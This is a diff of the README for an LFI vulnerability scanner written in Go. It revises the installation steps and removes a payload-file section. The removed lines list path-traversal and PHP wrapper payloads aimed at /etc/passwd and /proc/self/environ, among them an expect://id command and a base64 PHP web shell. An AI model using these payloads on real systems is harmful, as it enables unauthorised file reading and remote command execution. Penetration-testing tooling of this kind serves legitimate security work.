@@ -1,7 +1,7 @@
 <p align="center">
   <img src="https://img.shields.io/badge/Go-1.18+-00ADD8?style=for-the-badge&logo=go&logoColor=white" alt="Go Version"/>
   <img src="https://img.shields.io/badge/License-MIT-green?style=for-the-badge" alt="License"/>
-  <img src="https://img.shields.io/badge/Platform-Linux%20|%20Windows%20|%20macOS-blue?style=for-the-badge" alt="Platform"/>
+  <img src="https://img.shields.io/badge/Platform-Linux%20|%20macOS-blue?style=for-the-badge" alt="Platform"/>
   <img src="https://img.shields.io/badge/Version-1.0.0-red?style=for-the-badge" alt="Version"/>
 </p>
 
@@ -9,10 +9,6 @@
 
 <p align="center">
   <b>A blazing-fast, concurrent Local File Inclusion (LFI) vulnerability scanner with WAF bypass capabilities</b>
-</p>
-
-<p align="center">
-  <img src="https://user-images.githubusercontent.com/placeholder/lfix-demo.gif" alt="LFix Demo" width="700"/>
 </p>
 
 ---
@@ -38,32 +34,40 @@
 
 ## 📥 Installation
 
-### Option 1: Go Install (Recommended)
+### Requirements
+
+- **Go 1.18+** must be installed on your system
+
+### Step 1: Install Go (if not installed)
 
 ```bash
-go install github.com/Serdar715/lfix@latest
+# Ubuntu/Debian
+sudo apt update && sudo apt install golang-go -y
+
+# Fedora
+sudo dnf install golang -y
+
+# Arch Linux
+sudo pacman -S go --noconfirm
 ```
 
-### Option 2: Build from Source
+### Step 2: Clone and Build
 
 ```bash
-# Clone the repository
-git clone https://github.com/Serdar715/lfix.git
-cd lfix
+git clone https://github.com/Serdar715/lfix.git && cd lfix && go build -o lfix lfix.go && chmod +x lfix
+```
 
-# Build the binary
-go build -o lfix lfix.go
+### Step 3: Add to PATH (Optional but Recommended)
 
-# (Linux/macOS) Move to PATH
+```bash
 sudo mv lfix /usr/local/bin/
-
-# (Windows) Add to PATH or use directly
-.\lfix.exe
 ```
 
-### Option 3: Download Pre-built Binary
+### Step 4: Verify Installation
 
-Download the latest release from [Releases](https://github.com/Serdar715/lfix/releases) page.
+```bash
+lfix -h
+```
 
 ---
 
@@ -106,9 +110,7 @@ lfix -u "http://target.com/page.php?file=test" -v -debug
 
 ---
 
-## 📖 Usage Guide
-
-### Command Line Options
+## 📖 Command Line Options
 
 | Flag | Description | Default |
 |------|-------------|---------|
@@ -129,8 +131,6 @@ lfix -u "http://target.com/page.php?file=test" -v -debug
 
 ### Using FUZZ Keyword
 
-LFix supports the `FUZZ` keyword for precise injection point targeting:
-
 ```bash
 # URL parameter fuzzing
 lfix -u "http://target.com/page.php?file=FUZZ"
@@ -148,8 +148,6 @@ lfix -u "http://target.com/" -H "X-Include-File: FUZZ"
 
 ### Signature Categories
 
-LFix detects LFI vulnerabilities by analyzing response bodies for:
-
 #### 🐧 Linux/Unix Signatures
 - `/etc/passwd` content patterns (`root:x:0:0`, `daemon:x:`, `www-data:x:`)
 - Shell path references (`/bin/bash`, `/bin/sh`)
@@ -157,7 +155,7 @@ LFix detects LFI vulnerabilities by analyzing response bodies for:
 
 #### 💻 Windows Signatures
 - `win.ini` content patterns (`[boot loader]`, `[fonts]`)
-- System file references (`drivers\\etc\\hosts`)
+- System file references
 
 #### ⚠️ Application Error Patterns
 - PHP errors (`Warning: include(`, `failed to open stream`)
@@ -165,13 +163,11 @@ LFix detects LFI vulnerabilities by analyzing response bodies for:
 - Source code leakage (`<?php`)
 
 #### 🔐 Base64-Encoded Responses
-Automatically detects and decodes Base64 content in responses for hidden LFI indicators.
+Automatically detects and decodes Base64 content in responses.
 
 ---
 
 ## 🛡️ WAF Bypass Techniques
-
-When mutation mode is enabled (`-mutate=true`), LFix automatically generates payload variations:
 
 | Technique | Example |
 |-----------|---------|
@@ -183,27 +179,7 @@ When mutation mode is enabled (`-mutate=true`), LFix automatically generates pay
 
 ---
 
-## 📂 Payload File Format
-
-Create custom payload files with one payload per line:
-
-```text
-../../../etc/passwd
-/etc/passwd
-php://filter/convert.base64-encode/resource=index.php
-....//....//....//etc/passwd
-../../../../windows/win.ini
-../../../../../../proc/self/environ
-php://input
-expect://id
-data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
-```
-
----
-
 ## 🤝 Integration Examples
-
-### With Other Tools
 
 ```bash
 # Combine with waybackurls
@@ -219,8 +195,6 @@ cat domains.txt | httpx -paths /page.php?file=test | lfix
 lfix -u "http://target.com/page.php?file=test" -proxy "http://127.0.0.1:8080"
 ```
 
-
-
 ---
 
 ## 📊 Sample Output
@@ -228,8 +202,8 @@ lfix -u "http://target.com/page.php?file=test" -proxy "http://127.0.0.1:8080"
 ```
   ██╗     ███████╗██╗██╗  ██╗
   ██║     ██╔════╝██║╚██╗██╔╝
-  ██║     █████╗  ██║ ╚███╔╝ 
-  ██║     ██╔══╝  ██║ ██╔██╗ 
+  ██║     █████╗  ██║ ╚███╔╝
+  ██║     ██╔══╝  ██║ ██╔██╗
   ███████╗██║     ██║██╔╝ ██╗
   ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝
   lfix v1.0.0 - Advanced LFI Scanner
@@ -258,14 +232,18 @@ The developers assume no liability for misuse of this software.
 
 ---
 
+## 📄 License
 
+MIT License - see [LICENSE](LICENSE) file.
+
+---
 
 <p align="center">
   <b>Made with ❤️ for the Security Community</b>
 </p>
 
 <p align="center">
-  <a href="https://github.com/yourusername/lfix/issues">Report Bug</a>
+  <a href="https://github.com/Serdar715/lfix/issues">Report Bug</a>
   ·
-  <a href="https://github.com/yourusername/lfix/issues">Request Feature</a>
+  <a href="https://github.com/Serdar715/lfix/issues">Request Feature</a>
 </p>
